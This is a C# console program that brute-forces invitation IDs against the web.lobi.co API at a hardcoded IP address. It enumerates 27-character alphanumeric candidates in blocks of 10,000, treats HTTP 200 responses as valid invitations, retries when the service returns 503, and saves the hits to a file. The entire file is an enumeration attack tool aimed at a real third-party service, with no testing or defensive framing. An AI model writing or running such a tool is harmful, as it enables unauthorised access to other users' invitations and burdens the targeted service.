using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using LobiBruteForceLib;

namespace BruteForcerCUI
{
    class Program
    {
        public static byte[] FromHexString(string str)
        {
            int length = str.Length / 2;
            byte[] bytes = new byte[length];
            int j = 0;
            for (int i = 0; i < length; i++)
            {
                bytes[i] = Convert.ToByte(str.Substring(j, 2), 16);
                j += 2;
            }
            return bytes;
        }

        static void BruteInvite()
        {
            var generator = new NumGenerator("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 27);
            var bf = new LobiBruteForcer("52.197.40.190"/*"52.197.61.130"*/, "web.lobi.co", "/api/invitation/info?uid={ID}", InviteChecker);

            var sw = new Stopwatch();

            var available = new List<string>();
            var block = new List<string>();
            int BLOCK_SIZE = 10000;
            do
            {
                sw.Reset();
                sw.Start();

                block.Clear();
                for (int i = 0; i < BLOCK_SIZE; ++i)
                {
                    block.Add(generator.ToString());
                    if (generator.Add(1))
                        break;
                }
                available.AddRange(bf.FilterAvailable(block));

                sw.Stop();
                Console.WriteLine("BlockSize: {0}, TotalFound: {1}, Time: {2}ms", BLOCK_SIZE, available.Count, sw.ElapsedMilliseconds);
            } while (block.Count == BLOCK_SIZE);

            Console.WriteLine("Finish!");
            System.IO.File.WriteAllLines($"invite{generator.Digits}_all.txt", available.ToArray());
            Console.ReadKey(true);
        }

        static void Main(string[] args)
        {
            BruteInvite();
        }

        static CheckResult InviteChecker(Response response)
        {
            if (response.StatusCode == 200)
                return CheckResult.Available;
            else if (response.StatusCode == 404)
                return CheckResult.Unavailable;
            else if (response.StatusCode == 503)
                return CheckResult.Retry;
            else
                return CheckResult.Unavailable;
        }
    }
}
